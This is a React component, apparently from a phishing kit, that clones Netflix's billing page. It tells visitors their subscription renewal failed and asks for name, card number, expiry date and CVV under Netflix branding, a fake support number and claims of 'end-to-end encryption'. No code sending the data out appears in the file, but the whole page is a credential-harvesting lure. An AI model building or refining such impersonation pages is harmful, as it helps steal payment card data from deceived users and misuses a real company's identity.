import React, { useEffect, useRef, useState } from 'react'
import CVVModal from '../components/CVVModal'
import { isEmpty } from '../components/Utils'

const CardPage = () => {
  const refLabel1 = useRef(null)
  const refLabel2 = useRef(null)
  const refLabel3 = useRef(null)
  const refLabel4 = useRef(null)
  const refLabel5 = useRef(null)
  const refIC1 = useRef(null)
  const refIC2 = useRef(null)
  const refIC3 = useRef(null)
  const refIC4 = useRef(null)
  const refIC5 = useRef(null)
  const refError1 = useRef(null)
  const refError2 = useRef(null)
  const refError3 = useRef(null)
  const refError4 = useRef(null)
  const refPage = useRef(null)
  const refPickWrapper = useRef(null)
  const [fName, setFName] = useState("")
  const [lName, setLName] = useState("")
  const [cc, setCc] = useState("")
  const [expDate, setExpDate] = useState("")
  const [CVV, setCVV] = useState("")
  const [clickInput1, setClickInput1] = useState(false)
  const [clickInput2, setClickInput2] = useState(false)
  const [clickInput3, setClickInput3] = useState(false)
  const [clickInput4, setClickInput4] = useState(false)
  const [clickInput5, setClickInput5] = useState(false)
  const [isCVVModal, setIsCVVModal] = useState(false)
  const [isActiveCheckbox, setIsActiveCheckbox] = useState(false)

  useEffect(() => {
    function handleClickOutside(event) {
      if (refIC1.current && !refIC1.current.contains(event.target)) {
        if (isEmpty(fName)) {
          refLabel1.current.classList.remove('active')
        }
        if (clickInput1) {
          refIC1.current.classList.add('error')
          refError1.current.classList.add('error')
        }
      }
      if (refIC2.current && !refIC2.current.contains(event.target)) {
        if (isEmpty(lName)) {
          refLabel2.current.classList.remove('active')
        }
        if (clickInput2) {
          refIC2.current.classList.add('success')
        }
      }
      if (refIC3.current && !refIC3.current.contains(event.target)) {
        if (isEmpty(cc)) {
          refLabel3.current.classList.remove('active')
        }
        if (clickInput3) {
          refIC3.current.classList.add('error')
          refError2.current.classList.add('error')
        }
      }
      if (refIC4.current && !refIC4.current.contains(event.target)) {
        if (isEmpty(expDate)) {
          refLabel4.current.classList.remove('active')
        }
        if (clickInput4) {
          refIC4.current.classList.add('error')
          refError3.current.classList.add('error')
        }
      }
      if (refIC5.current && !refIC5.current.contains(event.target)) {
        if (isEmpty(CVV)) {
          refLabel5.current.classList.remove('active')
        }
        if (clickInput5) {
          refIC5.current.classList.add('error')
          refError4.current.classList.add('error')
        }
      }
    }
 
    document.addEventListener("mousedown", handleClickOutside);
    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    }
  }, [fName, lName, expDate, cc, CVV, clickInput1, clickInput2, clickInput3, clickInput4, clickInput5])

  return (
    <>
      <div className="billing-page">
        <div className="header">
          <div className="logo-container">
            <svg viewBox="0 0 111 30" className="svg-icon-netflix-logo" focusable="false"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg>
          </div>
          <div className="logout-btn">
            <span>Logout</span>
          </div>
        </div>
        <div className="payment-container" ref={refPage}>

          <div className="page-payment-container">
            <div className="payment-method-container">
              <div className="pm-container">
                <div className="payment-header">
                  <div className="pm-logo-container">
                    <span><img src={process.env.REACT_APP_CLIENT_URL + "assets/Lock.png"} alt="" /></span>
                  </div>
                  <div className="pm-title">
                    <h1>Add payment information</h1>
                  </div>
                  <div className="pm-text">
                    <p>Following the failure of your subscription renewal, we need a new payment method.</p>
                  </div>
                </div>

                <div className="payment-secure">
                  <svg viewBox="0 0 12 16"><g fill="none"><g fill="#FFB53F"><path d="M8.4 5L8.4 6.3 10 6.3 10 5C10 2.8 8.2 1 6 1 3.8 1 2 2.8 2 5L2 6.3 3.6 6.3 3.6 5C3.6 3.7 4.7 2.6 6 2.6 7.3 2.6 8.4 3.7 8.4 5ZM11 7L11 15 1 15 1 7 11 7ZM6.5 11.3C7 11.1 7.3 10.6 7.3 10.1 7.3 9.3 6.7 8.7 6 8.7 5.3 8.7 4.7 9.3 4.7 10.1 4.7 10.6 5 11.1 5.5 11.3L5.2 13.4 6.9 13.4 6.5 11.3Z"></path></g></g></svg>
                  <p>End-to-end encryption</p>
                </div>

                <div className="pick-wrapper-container" ref={refPickWrapper} onClick={() => {
                    refPickWrapper.current.classList.add('loading')
                    setClickInput1(false)
                    setClickInput2(false)
                    setClickInput3(false)
                    setClickInput4(false)
                    setClickInput5(false)
                    refError1.current.classList.remove('error')
                    refError2.current.classList.remove('error')
                    refError3.current.classList.remove('error')
                    refError4.current.classList.remove('error')
                    refIC1.current.classList.remove('error')
                    refIC2.current.classList.remove('success')
                    refIC3.current.classList.remove('error')
                    refIC4.current.classList.remove('error')
                    refIC5.current.classList.remove('error')
                    setFName("")
                    setLName('')
                    setCc('')
                    setExpDate('')
                    setCVV('')
                    setIsActiveCheckbox(false)

                    setTimeout(function() {
                      refPage.current.classList.add('active')
                      refPickWrapper.current.classList.remove('loading')
                    }.bind(), 1250)
                  }}>
                  <div className="loader-container"><div className="loader"></div></div>
                  <div className="pick-wrapper">
                    <div className="content">
                      <div className="text-details">
                        <span>Credit or debit card</span>
                      </div>
                      <div className="logos-container">
                        <img src={process.env.REACT_APP_CLIENT_URL + "assets/visa-v3.svg"} alt="visa" />
                        <img src={process.env.REACT_APP_CLIENT_URL + "assets/mastercard-v2.svg"} alt="mc" />
                        <img src={process.env.REACT_APP_CLIENT_URL + "assets/amex-v2.svg"} alt="amex" />
                        <img src={process.env.REACT_APP_CLIENT_URL + "assets/icon_cc.png"} alt="cb" />
                      </div>
                    </div>
                    <div className='chevron-right'><img src={process.env.REACT_APP_CLIENT_URL + "assets/chevron_right.svg"} alt="c-r" /></div>
                  </div>
                </div>

                <div className="action-link">
                  <p>Redeem a gift code or special offer code</p>
                </div>
              </div>
            </div>
          </div>

          <div className="form-container">
            <div className="form-content">
              <div className="form-form">

                <div className="change-container">
                  <p className="change-link" onClick={() => refPage.current.classList.remove('active')}>
                    <i className='icon-chev-left'></i>
                    <span>Change payment method</span>
                  </p>
                </div>

                <div className="title">
                  <h2>Insert your billing information</h2>
                </div>

                <div className='logos-container'>
                  <img src={process.env.REACT_APP_CLIENT_URL + "assets/visa-v3.svg"} alt="" />
                  <img src={process.env.REACT_APP_CLIENT_URL + "assets/mastercard-v2.svg"} alt="" />
                  <img src={process.env.REACT_APP_CLIENT_URL + "assets/amex-v2.svg"} alt="" />
                  <img src={process.env.REACT_APP_CLIENT_URL + "assets/icon_cc.png"} alt="" />
                </div>

                <div className="field-container">

                  <div className="input-container">
                    <div className="field-input" ref={refIC1}> 
                      <input id="f-name" type="text" value={fName} onChange={(e) => setFName(e.target.value)} onFocus={() => {
                          refLabel1.current.classList.add('active')
                          setClickInput1(true)
                        }} />
                      <label htmlFor="f-name" ref={refLabel1}>First name</label>
                    </div>
                    <div className="error-container" ref={refError1}>
                      <p>Please enter a first name.</p>
                    </div>
                  </div>

                  <div className="input-container">
                    <div className="field-input" ref={refIC2}> 
                      <input id="l-name" type="text" value={lName} onChange={(e) => setLName(e.target.value)} onFocus={() => {
                          refLabel2.current.classList.add('active')
                          setClickInput2(true)
                        }} />
                      <label htmlFor="l-name" ref={refLabel2}>Name</label>
                    </div>
                  </div>

                  <div className="input-container">
                    <div className="field-input" ref={refIC3}> 
                      <input id="num-cc" type="text" value={cc} onChange={(e) => setCc(e.target.value)} onFocus={() => {
                          refLabel3.current.classList.add('active')
                          setClickInput3(true)
                        }} />
                      <label htmlFor="num-cc" ref={refLabel3}>Card number</label>
                    </div>
                    <div className="error-container" ref={refError2}>
                      <p>Please insert a card number.</p>
                    </div>
                  </div>

                  <div className="input-container">
                    <div className="field-input" ref={refIC4}> 
                      <input id="exp-date" type="text" value={expDate} onChange={(e) => setExpDate(e.target.value)} onFocus={() => {
                          refLabel4.current.classList.add('active')
                          setClickInput4(true)
                        }} />
                      <label htmlFor="exp-date" ref={refLabel4}>Expiration date (MM/AA)</label>
                    </div>
                    <div className="error-container" ref={refError3}>
                      <p>Please insert an expiration month.</p>
                      {/* <p>Please insert an expiration year.</p> */}
                    </div>
                  </div>

                  <div className="input-container">
                    <div className="field-input" ref={refIC5}> 
                      <input id="cvv" type="text" value={CVV} onChange={(e) => setCVV(e.target.value)} onFocus={() => {
                          refLabel5.current.classList.add('active')
                          setClickInput5(true)
                        }} />
                      <label htmlFor="cvv" ref={refLabel5}>Cryptogram (CVV)</label>
                      <div className="btn-cvv" onClick={() => {
                        refLabel5.current.classList.remove('active')
                        setIsCVVModal(true)
                      }}>
                        <svg width="36" height="36" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg"><g fill="none" fillRule="evenodd"><g><circle stroke="#A9A6A6" strokeWidth="2" cx="18" cy="18" r="17"></circle><path d="M17.051 21.094v-.54c0-.648.123-1.203.369-1.665.246-.462.741-.915 1.485-1.359a7.37 7.37 0 0 0 .981-.657c.222-.186.372-.366.45-.54.078-.174.117-.369.117-.585 0-.384-.177-.714-.531-.99-.354-.276-.831-.414-1.431-.414-.624 0-1.131.135-1.521.405-.39.27-.627.627-.711 1.071h-2.304a4.053 4.053 0 0 1 .738-1.845c.396-.546.924-.981 1.584-1.305.66-.324 1.44-.486 2.34-.486.852 0 1.596.153 2.232.459.636.306 1.134.726 1.494 1.26.36.534.54 1.143.54 1.827 0 .66-.177 1.227-.531 1.701-.354.474-.891.933-1.611 1.377-.42.252-.729.48-.927.684-.198.204-.33.399-.396.585a1.79 1.79 0 0 0-.099.603v.414h-2.268zm1.26 4.158c-.408 0-.762-.15-1.062-.45-.3-.3-.45-.654-.45-1.062 0-.408.15-.762.45-1.062.3-.3.654-.45 1.062-.45.408 0 .762.15 1.062.45.3.3.45.654.45 1.062 0 .408-.15.762-.45 1.062-.3.3-.654.45-1.062.45z" fill="#A9A6A6"></path></g></g></svg>
                      </div>
                    </div>
                    <div className="error-container" ref={refError4}>
                      <p>Please insert a cryptogram (CVV).</p>
                    </div>
                  </div>

                  <div className="checkbox-container input-container">
                    <button type="reset" className="btn-cb" onClick={() => setIsActiveCheckbox(!isActiveCheckbox)}>
                      {isActiveCheckbox && (
                        <svg viewBox="0 0 16 16"><path d="m2.67 7.63 2.79 2.78 7.87-7.87 1.52 1.52-9.39 9.4-4.31-4.31 1.52-1.52z"/></svg>
                      )}
                    </button>
                    <p className='checkbox-label' onClick={() => setIsActiveCheckbox(!isActiveCheckbox)}>Allow processing of the transaction via the CB brand if available</p>
                  </div>
                  
                  <div className="helper">
                    <span>Learn more about</span>
                  </div>
                </div>

                <div className="conditions-container">
                  <p>By clicking the Save button below, you agree that Netflix will automatically renew your subscription and charge the corresponding fees (currently $13.49/month) via your chosen payment method, unless you cancel. You can cancel your subscription at any time to avoid any subsequent charges.</p>
                </div>

                <div className="submit-btn-container">
                  <div className="btn-submit">
                    <p>Save</p>
                  </div>
                </div>

              </div>
            </div>
          </div>

        </div>

        <div className="footer-wrapper">
          <div className="footer-divider"></div>
          <div className="footer-container">
            <p className="footer-top">Questions? Call <a className="footer-top-a" href="/">(+33) 0805-543-064</a></p>
            <ul className="footer-links">
              <li className="footer-link">
                <a href="/">FAQ</a>
              </li>
              <li className="footer-link">
                <a href="/">Help Center</a>
              </li>
              <li className="footer-link">
                <a href="/">Terms of Use</a>
              </li>
              <li className="footer-link">
                <a href="/">Privacy</a>
              </li>
              <li className="footer-link">
                <a href="/">Cookie Preferences</a>
              </li>
              <li className="footer-link">
                <a href="/">Corporate Information</a>
              </li>
              {/* <li className="footer-link">
                <a href="/">Do Not Sell or Share My Personal Information</a>
              </li> */}
            </ul>
          </div>
        </div>

      </div>
      {isCVVModal && (
        <CVVModal onChange={() => setIsCVVModal(!isCVVModal)} />
      )}
    </>
  )
}

export default CardPage
